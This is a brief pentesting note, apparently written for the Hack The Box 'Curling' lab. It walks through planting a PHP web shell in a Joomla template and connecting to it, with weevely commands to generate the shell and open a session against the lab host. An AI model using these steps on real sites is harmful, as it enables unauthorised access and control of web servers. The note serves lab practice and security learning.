# Joomla! - Get a shell


Getting a shell via the Joomla is the same principle as getting a shell via the WordPress panel - you edit a .php page in the templates.

1. Pick a template
Go to Extensions - > Templates - > Templates and pick a template.
In this example I picked beeze3.

2. Create a new file
From the drop down menu pick .php, name it whatever you like, and in the contents of the page paste a .php shell

2a) Generate a shell
Here I'm using weevely
root@kali:~/htbCurling# weevely generate magic password
Generated 'magic' with password 'password' of 762 byte size.


2b) Copy shell into new page
Copy/paste the shell into the content section of the new file template.
root@kali:~/htbCurling# cat magic


3. Verify the file
Check the new file is there by navigating to the shell, you should just see a blank page:
http://10.10.10.150/templates/beeze3/magic

4. Access your shell
root@kali:~/htbCurling# weevely http://10.10.10.150/templates/beeze3/magic password


You should have a shell!
